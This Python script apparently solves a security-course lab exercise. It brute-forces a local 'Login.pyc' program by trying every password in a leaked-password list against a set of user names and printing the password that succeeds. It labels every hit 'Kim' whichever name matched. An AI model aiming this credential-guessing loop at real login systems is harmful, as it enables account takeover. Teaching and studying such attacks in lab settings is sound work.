import time
import subprocess
from tqdm import tqdm 

def main():
  start_time = time.time()
  
  passwords = set()
  gang_names = set()
  
  with open("CSE3140\Lab 1\Q3\PwnedPWs100k.txt", encoding="utf8") as pw_file:
    passwords.update(line.strip() for line in pw_file)
  
  with open("CSE3140\Lab 1\Q3\gang", encoding="utf8") as gang_file:
    gang_names.update(line.strip() for line in gang_file)
  
  gang_names.discard("Bonnie")
  gang_names.discard("Adam")
  
  for password in tqdm(passwords):
    for name in gang_names:
      result = subprocess.run(['python3', 'Login.pyc', name, password], capture_output=True , text=True)
      if "success" in result.stdout:
        print("Kim", password)
        break     
  
  end_time = time.time()
  elapsed_time = end_time - start_time
  
  #print(passwords)
  #print(gang_names)
  print(elapsed_time)
  
if __name__ == "__main__":
  main()